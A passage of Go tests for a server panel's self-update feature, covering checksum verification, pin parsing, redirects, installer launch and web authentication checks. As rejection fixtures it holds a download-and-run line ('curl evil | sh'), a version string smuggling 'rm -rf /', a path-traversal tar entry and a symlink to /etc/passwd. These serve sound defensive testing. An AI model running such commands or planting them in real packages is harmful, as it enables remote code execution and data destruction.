package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// ---- a fake update server and agent ----

type tarEntry struct {
	name     string
	mode     int64
	body     string
	typeflag byte
	link     string
}

func makeTarball(t *testing.T, entries []tarEntry) ([]byte, string) {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		flag := e.typeflag
		if flag == 0 {
			flag = tar.TypeReg
		}
		h := &tar.Header{Name: e.name, Mode: e.mode, Typeflag: flag, Linkname: e.link, ModTime: time.Unix(1700000000, 0)}
		if flag == tar.TypeReg {
			h.Size = int64(len(e.body))
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if flag == tar.TypeReg {
			tw.Write([]byte(e.body))
		}
	}
	tw.Close()
	gz.Close()
	sum := sha256.Sum256(buf.Bytes())
	return buf.Bytes(), hex.EncodeToString(sum[:])
}

// releaseFiles is a minimal valid package; install is the body of its install.sh.
func releaseFiles(ver, install string) []tarEntry {
	binary := "#!/bin/sh\necho 'JunPanel " + ver + "'\n"
	return []tarEntry{
		{name: "junpanel/", typeflag: tar.TypeDir, mode: 0755},
		{name: "junpanel/install.sh", mode: 0755, body: "#!/usr/bin/env bash\n" + install},
		{name: "junpanel/bin/", typeflag: tar.TypeDir, mode: 0755},
		{name: "junpanel/bin/junpanel-linux-" + runtime.GOARCH, mode: 0755, body: binary},
		{name: "junpanel/bin/SHA256SUMS", mode: 0644, body: "deadbeef  junpanel-linux-" + runtime.GOARCH + "\n"},
	}
}
func pinScript(ver, hash string) string {
	return "#!/usr/bin/env bash\nmain() (\n  local version=" + ver + "\n  local expected=" + hash + "\n  local public_ref=ccb593f39637aba35e43c9e6132d956114673833\n  local public_hash=" + strings.Repeat("1", 64) + "\n)\n"
}

type updateServer struct {
	mu       sync.Mutex
	srv      *httptest.Server
	script   string
	notes    string
	noNotes  bool
	tarballs map[string][]byte
	status   map[string]int
	hits     map[string]int
}

func newUpdateServer(t *testing.T) *updateServer {
	t.Helper()
	u := &updateServer{tarballs: map[string][]byte{}, status: map[string]int{}, hits: map[string]int{}}
	u.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		u.mu.Lock()
		defer u.mu.Unlock()
		u.hits[r.URL.Path]++
		if code := u.status[r.URL.Path]; code != 0 {
			w.WriteHeader(code)
			return
		}
		switch {
		case r.URL.Path == "/raw/quick-install.sh":
			io.WriteString(w, u.script)
		case strings.HasPrefix(r.URL.Path, "/api/releases/tags/"):
			if u.noNotes {
				w.WriteHeader(404)
				return
			}
			json.NewEncoder(w).Encode(map[string]string{"body": u.notes})
		case strings.HasPrefix(r.URL.Path, "/dl/"):
			if b, ok := u.tarballs[r.URL.Path]; ok {
				w.Write(b)
				return
			}
			w.WriteHeader(404)
		default:
			w.WriteHeader(404)
		}
	}))
	t.Cleanup(u.srv.Close)
	return u
}
func (u *updateServer) hit(path string) int { u.mu.Lock(); defer u.mu.Unlock(); return u.hits[path] }
func (u *updateServer) publish(t *testing.T, ver string, entries []tarEntry) string {
	t.Helper()
	data, hash := makeTarball(t, entries)
	u.mu.Lock()
	u.tarballs["/dl/v"+ver+"/JunPanel-"+ver+"-linux.tar.gz"] = data
	u.script = pinScript(ver, hash)
	u.mu.Unlock()
	return hash
}

type upRig struct {
	t       *testing.T
	a       *agent
	now     time.Time
	srv     *updateServer
	systemd [][]string
	sdErr   error
	sdRun   bool // actually execute the script handed to systemd-run
}

const (
	curVer = "1.0.0"
	newVer = "1.1.0"
)

func newUpRig(t *testing.T) *upRig {
	t.Helper()
	old := version
	version = curVer
	t.Cleanup(func() { version = old })
	g := &upRig{t: t, now: at(2026, 10, 20, 10, 0), srv: newUpdateServer(t)}
	g.a = testAgent(t)
	g.a.now = func() time.Time { return g.now }
	g.a.upRaw, g.a.upAPI, g.a.upDL = g.srv.srv.URL+"/raw", g.srv.srv.URL+"/api", g.srv.srv.URL+"/dl"
	g.a.upPage = "https://example.test/repo"
	g.a.upHTTP = g.srv.srv.Client()
	g.a.upSystemd = os.Args[0]
	g.a.runner = func(d time.Duration, name string, args ...string) (string, error) {
		if name == g.a.upSystemd {
			g.systemd = append(g.systemd, append([]string{name}, args...))
			if g.sdErr != nil {
				return "", g.sdErr
			}
			if g.sdRun {
				out, _ := command(time.Minute, "/bin/bash", args[len(args)-1])
				return out, nil
			}
			return "Running as unit: junpanel-upgrade.service", nil
		}
		return command(d, name, args...)
	}
	return g
}
func (g *upRig) check() *upgradeState {
	g.t.Helper()
	g.now = g.now.Add(time.Minute)
	st, e := g.a.checkUpdate()
	if e != nil {
		g.t.Fatal(e)
	}
	return st
}
func (g *upRig) start() *httptest.ResponseRecorder {
	return request(g.a.routes(), "POST", "/upgrade/start", `{}`, nil, nil)
}
func (g *upRig) status() map[string]any {
	g.t.Helper()
	var out map[string]any
	r := request(g.a.routes(), "GET", "/upgrade", "", nil, nil)
	if r.Code != 200 {
		g.t.Fatalf("status %d %s", r.Code, r.Body.String())
	}
	json.Unmarshal(r.Body.Bytes(), &out)
	return out
}
func (g *upRig) run() *upgradeRun {
	g.t.Helper()
	st, e := g.a.readUpgrade()
	if e != nil {
		g.t.Fatal(e)
	}
	return st.Run
}
func (g *upRig) waitJob(body []byte) job {
	g.t.Helper()
	var started job
	json.Unmarshal(body, &started)
	for deadline := time.Now().Add(30 * time.Second); time.Now().Before(deadline); time.Sleep(20 * time.Millisecond) {
		for _, j := range g.a.jobs.list() {
			if j.ID == started.ID && j.State != "running" {
				return j
			}
		}
	}
	g.t.Fatal("upgrade job did not finish")
	return job{}
}

// ---- version information ----

func TestParsePinAndCompareVersions(t *testing.T) {
	ok := pinScript("0.1.9", strings.Repeat("ab", 32))
	if v, x, e := parsePin(ok); e != nil || v != "0.1.9" || x != strings.Repeat("ab", 32) {
		t.Fatalf("%q %q %v", v, x, e)
	}
	crlf := strings.ReplaceAll(ok, "\n", "\r\n")
	if v, _, e := parsePin(crlf); e != nil || v != "0.1.9" {
		t.Fatalf("CRLF script: %q %v", v, e)
	}
	for name, script := range map[string]string{
		"empty":               "",
		"no version":          "  local expected=" + strings.Repeat("a", 64) + "\n",
		"no hash":             "  local version=1.2.3\n",
		"short hash":          "  local version=1.2.3\n  local expected=abc\n",
		"uppercase hash":      "  local version=1.2.3\n  local expected=" + strings.Repeat("A", 64) + "\n",
		"non-numeric version": "  local version=1.2.x\n  local expected=" + strings.Repeat("a", 64) + "\n",
		"injected version":    "  local version=1.2.3; rm -rf /\n  local expected=" + strings.Repeat("a", 64) + "\n",
		"two versions":        "  local version=1.2.3\n  local version=9.9.9\n  local expected=" + strings.Repeat("a", 64) + "\n",
		"two hashes":          "  local version=1.2.3\n  local expected=" + strings.Repeat("a", 64) + "\n  local expected=" + strings.Repeat("b", 64) + "\n",
		"prefixed junk":       "  local version=v1.2.3\n  local expected=" + strings.Repeat("a", 64) + "\n",
	} {
		if _, _, e := parsePin(script); e == nil {
			t.Errorf("%s accepted", name)
		}
	}
	for _, c := range []struct {
		a, b string
		want int
	}{{"1.0.0", "1.0.0", 0}, {"1.0.1", "1.0.0", 1}, {"0.9.9", "1.0.0", -1}, {"0.1.10", "0.1.9", 1}, {"0.2.0", "0.1.99", 1}, {"2.0.0", "1.99.99", 1}, {"0.1.8", "0.1.10", -1}} {
		if got := compareVersions(c.a, c.b); got != c.want {
			t.Errorf("compare(%s,%s) = %d, want %d", c.a, c.b, got, c.want)
		}
	}
}

func TestCheckUpdate(t *testing.T) {
	g := newUpRig(t)
	g.srv.notes = strings.Repeat("新功能说明。", 2000) + "**粗体**"
	hash := g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	st := g.check()
	if st.Latest == nil || st.Latest.Version != newVer || st.Latest.Expected != hash || st.CheckError != "" || g.a.updateAvailable() != newVer {
		t.Fatalf("latest: %+v", st)
	}
	if n := len([]rune(st.Latest.Notes)); n > notesLimit+1 || !strings.HasSuffix(st.Latest.Notes, "…") {
		t.Fatalf("notes not shortened on a character boundary: %d", n)
	}
	status := g.status()
	if status["available"] != true || status["current"] != curVer || status["notes_url"] != "https://example.test/repo/releases/tag/v"+newVer || status["supported"] != true || status["can_upgrade"] != true {
		t.Fatalf("status: %v", status)
	}

	// Release notes are optional.
	g.srv.noNotes = true
	g.check()
	if st, _ = g.a.readUpgrade(); st.Latest.Version != newVer {
		t.Fatal("missing notes broke the check")
	}
	// Same or older versions are not offered.
	for _, v := range []string{curVer, "0.9.0"} {
		g.srv.publish(t, v, releaseFiles(v, ""))
		g.check()
		if g.a.updateAvailable() != "" || g.status()["available"] != false || g.status()["can_upgrade"] != false {
			t.Fatalf("%s offered as an update", v)
		}
	}
	// A failed check keeps the last good answer and records the error.
	g.srv.publish(t, newVer, releaseFiles(newVer, ""))
	g.check()
	g.srv.mu.Lock()
	g.srv.script = "garbage"
	g.srv.mu.Unlock()
	st = g.check()
	if st.CheckError == "" || st.Latest == nil || st.Latest.Version != newVer || g.a.updateAvailable() != newVer {
		t.Fatalf("after a bad script: %+v", st)
	}
	for name, setup := range map[string]func(){
		"server error": func() { g.srv.mu.Lock(); g.srv.status["/raw/quick-install.sh"] = 500; g.srv.mu.Unlock() },
		"oversize": func() {
			g.srv.mu.Lock()
			g.srv.status["/raw/quick-install.sh"] = 0
			g.srv.script = strings.Repeat("x", maxScriptBytes+10)
			g.srv.mu.Unlock()
		},
	} {
		setup()
		if st = g.check(); st.CheckError == "" || st.Latest == nil {
			t.Errorf("%s: %+v", name, st)
		}
	}
}

func TestCheckUpdateIsRateLimitedAndOptional(t *testing.T) {
	g := newUpRig(t)
	g.srv.publish(t, newVer, releaseFiles(newVer, ""))
	g.check()
	calls := g.srv.hit("/raw/quick-install.sh")
	for i := 0; i < 5; i++ {
		g.now = g.now.Add(time.Second)
		if _, e := g.a.checkUpdate(); e != nil {
			t.Fatal(e)
		}
	}
	if g.srv.hit("/raw/quick-install.sh") != calls {
		t.Fatal("repeated checks hit the server")
	}
	g.now = g.now.Add(updateManualGap + time.Second)
	g.a.checkUpdate()
	if g.srv.hit("/raw/quick-install.sh") != calls+1 {
		t.Fatal("a later check did not reach the server")
	}
	// The setting is stored and reported; the explicit check endpoint still works when it is off.
	h := g.a.routes()
	if r := request(h, "POST", "/upgrade/config", `{"auto_check":false}`, nil, nil); r.Code != 200 {
		t.Fatal(r.Body.String())
	}
	if g.status()["auto_check"] != false {
		t.Fatal("setting not stored")
	}
	g.now = g.now.Add(time.Hour)
	if r := request(h, "POST", "/upgrade/check", `{}`, nil, nil); r.Code != 200 || g.srv.hit("/raw/quick-install.sh") != calls+2 {
		t.Fatalf("manual check: %d", r.Code)
	}
	if r := request(h, "POST", "/upgrade/config", `{"auto_check":true,"x":1}`, nil, nil); r.Code != 400 {
		t.Fatal("unknown field accepted")
	}
	if r := request(h, "POST", "/upgrade/config", `{"auto_check":true}`, nil, nil); r.Code != 200 || g.status()["auto_check"] != true {
		t.Fatal("re-enabling")
	}
}

func TestUpdateCheckInterval(t *testing.T) {
	g := newUpRig(t)
	h := g.a.routes()
	if g.status()["interval_hours"] != float64(6) {
		t.Fatalf("default interval: %v", g.status()["interval_hours"])
	}
	for _, bad := range []string{`{"auto_check":true,"interval_hours":0}`, `{"auto_check":true,"interval_hours":5}`, `{"auto_check":true,"interval_hours":100000}`, `{"auto_check":true,"interval_hours":-1}`} {
		if r := request(h, "POST", "/upgrade/config", bad, nil, nil); r.Code != 400 {
			t.Fatalf("%s accepted: %d", bad, r.Code)
		}
	}
	for _, hours := range updateIntervals {
		body := fmt.Sprintf(`{"auto_check":true,"interval_hours":%d}`, hours)
		if r := request(h, "POST", "/upgrade/config", body, nil, nil); r.Code != 200 || g.status()["interval_hours"] != float64(hours) {
			t.Fatalf("interval %d: %d %v", hours, r.Code, g.status()["interval_hours"])
		}
	}
	// Turning the check off keeps the interval; leaving the field out keeps it too.
	request(h, "POST", "/upgrade/config", `{"auto_check":true,"interval_hours":24}`, nil, nil)
	request(h, "POST", "/upgrade/config", `{"auto_check":false}`, nil, nil)
	if s := g.status(); s["interval_hours"] != float64(24) || s["auto_check"] != false {
		t.Fatalf("%v", s)
	}
	// The background check is due only when it is on and the interval has passed.
	now := time.Now()
	st := &upgradeState{IntervalHours: 12, CheckedAt: now.Add(-11 * time.Hour)}
	if st.autoCheckDue(now) || !st.autoCheckDue(now.Add(2*time.Hour)) || !(&upgradeState{}).autoCheckDue(now) {
		t.Fatal("due check wrong")
	}
	st.NoAutoCheck = true
	if st.autoCheckDue(now.Add(48 * time.Hour)) {
		t.Fatal("a disabled check is due")
	}
	if (&upgradeState{IntervalHours: 7}).interval() != 6*time.Hour {
		t.Fatal("an unknown stored interval must fall back to the default")
	}
}

func TestRedirectsNeverLeaveHTTPS(t *testing.T) {
	check := upgradeClient().CheckRedirect
	mk := func(raw string) *http.Request { u, _ := url.Parse(raw); return &http.Request{URL: u} }
	if e := check(mk("http://evil.example/x"), []*http.Request{mk("https://github.com/a")}); e == nil {
		t.Fatal("https to http redirect followed")
	}
	if e := check(mk("https://objects.example/x"), []*http.Request{mk("https://github.com/a")}); e != nil {
		t.Fatal("https to https blocked")
	}
	via := make([]*http.Request, 5)
	for i := range via {
		via[i] = mk("https://github.com/a")
	}
	if e := check(mk("https://github.com/b"), via); e == nil {
		t.Fatal("redirect loop not stopped")
	}
}

// ---- installing ----

func TestUpgradeDownloadsVerifiesAndStartsTheInstaller(t *testing.T) {
	g := newUpRig(t)
	g.srv.publish(t, newVer, releaseFiles(newVer, "echo installing\nexit 0\n"))
	g.check()
	r := g.start()
	if r.Code != 202 {
		t.Fatalf("%d %s", r.Code, r.Body.String())
	}
	if run := g.run(); run == nil || run.State != "running" || run.Target != newVer {
		t.Fatalf("run state: %+v", run)
	}
	j := g.waitJob(r.Body.Bytes())
	if j.State != "success" || !strings.Contains(j.Output, "校验通过") || !strings.Contains(j.Output, "程序版本核对通过") {
		t.Fatalf("job: %s\n%s", j.Error, j.Output)
	}
	dir := g.a.upgradeDir()
	script := filepath.Join(dir, "run-"+newVer+".sh")
	if len(g.systemd) != 1 {
		t.Fatalf("systemd-run calls: %v", g.systemd)
	}
	want := []string{g.a.upSystemd, "--unit", "junpanel-upgrade", "--description", "JunPanel upgrade to v" + newVer, "--collect", "/bin/bash", script}
	if fmt.Sprint(g.systemd[0]) != fmt.Sprint(want) {
		t.Fatalf("systemd-run arguments:\n got %v\nwant %v", g.systemd[0], want)
	}
	body, e := os.ReadFile(script)
	if e != nil {
		t.Fatal(e)
	}
	stage := filepath.Join(dir, "stage-"+newVer)
	wantScript := runScript(filepath.Join(dir, "upgrade.log"), filepath.Join(dir, "exit-code"), stage)
	if string(body) != wantScript || !strings.Contains(string(body), "'"+filepath.Join(stage, "junpanel", "install.sh")+"'") {
		t.Fatalf("script:\n%s", body)
	}
	if st, _ := os.Stat(script); st.Mode().Perm() != 0700 {
		t.Fatalf("script mode %v", st.Mode().Perm())
	}
	if _, e := os.Stat(filepath.Join(stage, "junpanel", "install.sh")); e != nil {
		t.Fatal("package not unpacked for the installer")
	}
	if _, e := os.Stat(filepath.Join(dir, "package-"+newVer+".tar.gz")); !os.IsNotExist(e) {
		t.Fatal("downloaded archive kept")
	}
	if st, _ := os.Stat(dir); st.Mode().Perm() != 0700 {
		t.Fatalf("upgrade directory mode %v", st.Mode().Perm())
	}
	// While it runs, nothing else can be started and the status says so.
	if r2 := g.start(); r2.Code != 409 || !strings.Contains(r2.Body.String(), "已有升级正在进行") {
		t.Fatalf("second start: %d %s", r2.Code, r2.Body.String())
	}
	if s := g.status(); s["can_upgrade"] != false || s["run"].(map[string]any)["state"] != "running" {
		t.Fatalf("status while running: %v", s)
	}
}

func TestInstallerScriptReallyRunsAndReports(t *testing.T) {
	for _, c := range []struct {
		name, install, code, wantRun string
		version                      string
	}{
		{"success", "echo installing now\nexit 0\n", "0", "done", newVer},
		{"installer failed", "echo about to fail\nexit 7\n", "7", "failed", curVer},
	} {
		t.Run(c.name, func(t *testing.T) {
			g := newUpRig(t)
			g.sdRun = true
			g.srv.publish(t, newVer, releaseFiles(newVer, c.install))
			g.check()
			if j := g.waitJob(g.start().Body.Bytes()); j.State != "success" {
				t.Fatalf("%s %s", j.Error, j.Output)
			}
			dir := g.a.upgradeDir()
			logText, _ := os.ReadFile(filepath.Join(dir, "upgrade.log"))
			exit, _ := os.ReadFile(filepath.Join(dir, "exit-code"))
			if !strings.Contains(string(logText), "[JunPanel upgrade] started") || !strings.Contains(string(logText), "installer exit code "+c.code) || strings.TrimSpace(string(exit)) != c.code {
				t.Fatalf("log:\n%s\nexit file %q", logText, exit)
			}
			if !strings.Contains(string(logText), strings.Fields(c.install)[1]) {
				t.Fatalf("installer output missing from the log:\n%s", logText)
			}
			if _, e := os.Stat(filepath.Join(dir, "stage-"+newVer)); !os.IsNotExist(e) {
				t.Fatal("unpacked package left behind after the installer finished")
			}
			// The agent that comes back decides the outcome from the exit code and its own version.
			version = c.version
			g.a.refreshRun(g.now)
			run := g.run()
			if run.State != c.wantRun || (c.wantRun == "failed" && !strings.Contains(run.Message, "退出码 7")) || (c.wantRun == "done" && !strings.Contains(run.Message, newVer)) {
				t.Fatalf("outcome: %+v", run)
			}
			if c.wantRun == "failed" && !strings.Contains(fmt.Sprint(g.status()["log"]), "about to fail") {
				t.Fatal("status does not show the installer log")
			}
		})
	}
}

func TestUpgradeRefusesBadPackages(t *testing.T) {
	cases := map[string]struct {
		prepare func(g *upRig) // publishes the good release, then breaks something
		message string
	}{
		"tampered download": {func(g *upRig) {
			g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
			other, _ := makeTarball(t, releaseFiles(newVer, "curl evil | sh\n"))
			g.srv.mu.Lock()
			g.srv.tarballs["/dl/v"+newVer+"/JunPanel-"+newVer+"-linux.tar.gz"] = other
			g.srv.mu.Unlock()
		}, "校验失败"},
		"truncated download": {func(g *upRig) {
			g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
			g.srv.mu.Lock()
			p := "/dl/v" + newVer + "/JunPanel-" + newVer + "-linux.tar.gz"
			g.srv.tarballs[p] = g.srv.tarballs[p][:100]
			g.srv.mu.Unlock()
		}, "校验失败"},
		"not found": {func(g *upRig) {
			g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
			g.srv.mu.Lock()
			delete(g.srv.tarballs, "/dl/v"+newVer+"/JunPanel-"+newVer+"-linux.tar.gz")
			g.srv.mu.Unlock()
		}, "HTTP 404"},
		"path traversal": {func(g *upRig) {
			g.srv.publish(t, newVer, append(releaseFiles(newVer, "exit 0\n"), tarEntry{name: "junpanel/../../escape.txt", mode: 0644, body: "x"}))
		}, "不安全"},
		"symlink": {func(g *upRig) {
			g.srv.publish(t, newVer, append(releaseFiles(newVer, "exit 0\n"), tarEntry{name: "junpanel/link", typeflag: tar.TypeSymlink, link: "/etc/passwd"}))
		}, "不安全"},
		"missing installer": {func(g *upRig) {
			files := releaseFiles(newVer, "exit 0\n")
			g.srv.publish(t, newVer, append(files[:1], files[2:]...))
		}, "缺少必要文件"},
		"wrong program version": {func(g *upRig) {
			files := releaseFiles(newVer, "exit 0\n")
			files[3].body = "#!/bin/sh\necho 'JunPanel 0.0.1'\n"
			g.srv.publish(t, newVer, files)
		}, "版本与预期不符"},
		"program that fails": {func(g *upRig) {
			files := releaseFiles(newVer, "exit 0\n")
			files[3].body = "#!/bin/sh\nexit 3\n"
			g.srv.publish(t, newVer, files)
		}, "版本与预期不符"},
		"oversize": {func(g *upRig) {
			g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
			g.a.upMax = 50
		}, "大小上限"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			g := newUpRig(t)
			c.prepare(g)
			g.check()
			r := g.start()
			if r.Code != 202 {
				t.Fatalf("%d %s", r.Code, r.Body.String())
			}
			j := g.waitJob(r.Body.Bytes())
			if j.State != "failed" || !strings.Contains(j.Error, c.message) {
				t.Fatalf("job: %s %s\n%s", j.State, j.Error, j.Output)
			}
			if len(g.systemd) != 0 {
				t.Fatalf("the installer was started for a rejected package: %v", g.systemd)
			}
			if run := g.run(); run.State != "failed" || !strings.Contains(run.Message, c.message) {
				t.Fatalf("run: %+v", run)
			}
			entries, _ := os.ReadDir(g.a.upgradeDir())
			for _, e := range entries {
				if strings.HasPrefix(e.Name(), "stage-") || strings.HasPrefix(e.Name(), "package-") || strings.HasPrefix(e.Name(), "run-") {
					t.Fatalf("leftover after a rejected package: %s", e.Name())
				}
			}
			if _, e := os.Stat(filepath.Join(filepath.Dir(g.a.upgradeDir()), "escape.txt")); e == nil {
				t.Fatal("a file was written outside the unpack directory")
			}
			// The failure is not final: the next attempt can start.
			if g.status()["run"].(map[string]any)["state"] != "failed" {
				t.Fatal("status")
			}
		})
	}
}

func TestUpgradeStopsCleanlyWhenSystemdRunFails(t *testing.T) {
	g := newUpRig(t)
	g.sdErr = fmt.Errorf("Failed to connect to bus")
	g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	g.check()
	j := g.waitJob(g.start().Body.Bytes())
	if j.State != "failed" || !strings.Contains(j.Error, "一键安装命令") {
		t.Fatalf("%s %s", j.State, j.Error)
	}
	entries, _ := os.ReadDir(g.a.upgradeDir())
	for _, e := range entries {
		if e.Name() != "upgrade.log" {
			t.Fatalf("leftover: %s", e.Name())
		}
	}
	if run := g.run(); run.State != "failed" {
		t.Fatalf("%+v", run)
	}
	// Retrying works once systemd-run does.
	g.sdErr = nil
	if j = g.waitJob(g.start().Body.Bytes()); j.State != "success" {
		t.Fatalf("retry: %s %s", j.State, j.Error)
	}
}

func TestUpgradePreconditions(t *testing.T) {
	g := newUpRig(t)
	if r := g.start(); r.Code != 400 || !strings.Contains(r.Body.String(), "没有可升级") {
		t.Fatalf("no check yet: %d %s", r.Code, r.Body.String())
	}
	g.srv.publish(t, curVer, releaseFiles(curVer, ""))
	g.check()
	if r := g.start(); r.Code != 400 {
		t.Fatalf("same version: %d", r.Code)
	}
	g.srv.publish(t, "0.5.0", releaseFiles("0.5.0", ""))
	g.check()
	if r := g.start(); r.Code != 400 {
		t.Fatalf("a downgrade was accepted: %d", r.Code)
	}
	g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	g.check()

	// Anything still running blocks the upgrade, and says what.
	release := make(chan struct{})
	started := make(chan struct{})
	if _, e := g.a.jobs.start("备份 · 网站 · 示例", func(ctx context.Context, out *limitedBuffer) error {
		close(started)
		<-release
		return nil
	}); e != nil {
		t.Fatal(e)
	}
	<-started
	r := g.start()
	if r.Code != 409 || !strings.Contains(r.Body.String(), "备份 · 网站 · 示例") {
		t.Fatalf("running job: %d %s", r.Code, r.Body.String())
	}
	if s := g.status(); s["can_upgrade"] != false || len(s["blockers"].([]any)) != 1 {
		t.Fatalf("blockers: %v", s["blockers"])
	}
	close(release)
	for deadline := time.Now().Add(5 * time.Second); len(g.a.upgradeBlockers(g.now)) > 0 && time.Now().Before(deadline); time.Sleep(10 * time.Millisecond) {
	}
	g.a.storeApps([]appRecord{{ID: "shop", Name: "商店", Template: "redis", Port: 7000, Busy: true}})
	if r = g.start(); r.Code != 409 || !strings.Contains(r.Body.String(), "商店") {
		t.Fatalf("busy app: %d %s", r.Code, r.Body.String())
	}
	g.a.storeApps(nil)
	g.a.schedRunning["sc_x"] = g.now
	if r = g.start(); r.Code != 409 || !strings.Contains(r.Body.String(), "计划任务") {
		t.Fatalf("running schedule: %d %s", r.Code, r.Body.String())
	}
	delete(g.a.schedRunning, "sc_x")
	// Without systemd-run the panel cannot restart itself safely and says so, changing nothing.
	g.a.upSystemd = filepath.Join(t.TempDir(), "missing")
	if r = g.start(); r.Code != 409 || !strings.Contains(r.Body.String(), "一键安装命令") {
		t.Fatalf("no systemd-run: %d %s", r.Code, r.Body.String())
	}
	if s := g.status(); s["supported"] != false || s["can_upgrade"] != false || s["unsupported_reason"] == "" {
		t.Fatalf("status without systemd-run: %v", s)
	}
	if g.run() != nil {
		t.Fatal("a refused start left a run record")
	}
}

func TestUpgradeProgressOnlyMovesForward(t *testing.T) {
	g := newUpRig(t)
	g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	g.check()
	g.a.setRun(upgradeRun{State: "running", Target: newVer, Started: g.now, Percent: 1})
	g.a.progress(newVer, "download", 40)
	g.a.progress(newVer, "download", 20)
	if run := g.run(); run.Percent != 40 || run.Stage != "download" {
		t.Fatalf("%+v", run)
	}
	g.a.progress("9.9.9", "install", 90) // another target: ignored
	g.a.setRun(upgradeRun{State: "failed", Target: newVer, Started: g.now})
	g.a.progress(newVer, "install", 90) // not running any more: ignored
	if run := g.run(); run.Percent != 0 || run.State != "failed" {
		t.Fatalf("%+v", run)
	}
}

func TestInterruptedUpgradeIsSettledAfterRestart(t *testing.T) {
	g := newUpRig(t)
	g.srv.publish(t, newVer, releaseFiles(newVer, "exit 0\n"))
	g.check()
	started := g.now
	// An upgrade that never finished and left no exit code: it times out.
	g.a.setRun(upgradeRun{State: "running", Target: newVer, Started: started})
	g.a.refreshRun(started.Add(time.Minute))
	if g.run().State != "running" {
		t.Fatal("settled too early")
	}
	g.a.refreshRun(started.Add(upgradeTimeout + time.Minute))
	if run := g.run(); run.State != "failed" || !strings.Contains(run.Message, "超时") {
		t.Fatalf("%+v", run)
	}
	// The record survives an agent restart, and the new agent settles it from its own version.
	g.a.setRun(upgradeRun{State: "running", Target: newVer, Started: started})
	version = newVer
	restarted, e := newAgent(g.a.cfg)
	if e != nil {
		t.Fatal(e)
	}
	restarted.now = g.a.now
	if st, _ := restarted.readUpgrade(); st.Run.State != "done" || !strings.Contains(st.Run.Message, newVer) || st.Latest == nil {
		t.Fatalf("after restart: %+v", st.Run)
	}
	if st, _ := restarted.readUpgrade(); st.Run.Percent != 100 || st.Run.Stage != "done" {
		t.Fatalf("finished upgrade not at 100%%: %+v", st.Run)
	}
	if restarted.updateAvailable() != "" {
		t.Fatal("update still offered after installing it")
	}
}

// ---- the web layer ----

func TestUpgradeNeedsThePasswordAgain(t *testing.T) {
	auth, pw := testAccount(t)
	web, e := newWeb(auth.Path, "unused", 8787, false)
	if e != nil {
		t.Fatal(e)
	}
	var mu sync.Mutex
	var forwarded []string
	web.proxy.Transport = roundTripFunc(func(r *http.Request) (*http.Response, error) {
		var body []byte
		if r.Body != nil {
			body, _ = io.ReadAll(r.Body)
		}
		mu.Lock()
		forwarded = append(forwarded, r.Method+" "+r.URL.Path+" body="+string(body))
		mu.Unlock()
		return fakeResponse(200, `{"ok":true}`), nil
	})
	token, session, e := web.auth.login("127.0.0.1", "admin", pw, "")
	if e != nil {
		t.Fatal(e)
	}
	h := web.routes()
	headers := map[string]string{"Origin": "http://127.0.0.1:8787", "X-CSRF-Token": session.CSRF, "Content-Type": "application/json"}
	cookie := &http.Cookie{Name: "junpanel_session", Value: token}
	count := func() int { mu.Lock(); defer mu.Unlock(); return len(forwarded) }

	// The agent's start endpoint cannot be reached around the check.
	for _, path := range []string{"/api/upgrade/start", "/api/upgrade/start/", "/api//upgrade/start", "/api/x/../upgrade/start", "/api/upgrade/./start", "/api/upgrade/start/anything"} {
		for _, method := range []string{"POST", "GET"} {
			if r := request(h, method, path, `{}`, headers, cookie); r.Code == 200 || count() != 0 {
				t.Fatalf("%s %s reached the agent: %d", method, path, r.Code)
			}
		}
	}
	noCSRF := map[string]string{"Origin": "http://127.0.0.1:8787", "Content-Type": "application/json"}
	if r := request(h, "POST", "/api/upgrade", `{}`, noCSRF, cookie); r.Code != 403 || count() != 0 {
		t.Fatalf("no CSRF token: %d", r.Code)
	}
	if r := request(h, "POST", "/api/upgrade", `{}`, headers, nil); r.Code != 401 || count() != 0 {
		t.Fatalf("no session: %d", r.Code)
	}
	badOrigin := map[string]string{"Origin": "http://evil.example", "X-CSRF-Token": session.CSRF, "Content-Type": "application/json"}
	if r := request(h, "POST", "/api/upgrade", `{}`, badOrigin, cookie); r.Code != 403 || count() != 0 {
		t.Fatalf("foreign origin: %d", r.Code)
	}
	// A signed-in administrator starts it without a password; whatever the body says,
	// nothing but an empty request reaches the agent.
	if r := request(h, "POST", "/api/upgrade", `{"version":"9.9.9","url":"http://evil.example/x.tgz"}`, headers, cookie); r.Code != 200 {
		t.Fatalf("signed in: %d %s", r.Code, r.Body.String())
	}
	if count() != 1 || forwarded[0] != "POST /upgrade/start body=" {
		t.Fatalf("forwarded: %v", forwarded)
	}
	// Status and checks pass straight through.
	request(h, "GET", "/api/upgrade", "", nil, cookie)
	request(h, "POST", "/api/upgrade/check", `{}`, headers, cookie)
	if want := []string{"POST /upgrade/start body=", "GET /upgrade body=", "POST /upgrade/check body={}"}; fmt.Sprint(forwarded) != fmt.Sprint(want) {
		t.Fatalf("forwarded: %v", forwarded)
	}
}

func TestDemoModeNeverUpgrades(t *testing.T) {
	web, e := newWeb("", "unused", 8787, true)
	if e != nil {
		t.Fatal(e)
	}
	h := web.routes()
	headers := map[string]string{"Origin": "http://127.0.0.1:8787", "Content-Type": "application/json"}
	w := request(h, "POST", "/api/login", `{"user":"demo","password":"JunPanelPreview2026!","otp":""}`, headers, nil)
	var session struct{ CSRF string }
	json.Unmarshal(w.Body.Bytes(), &session)
	headers["X-CSRF-Token"] = session.CSRF
	cookie := w.Result().Cookies()[0]
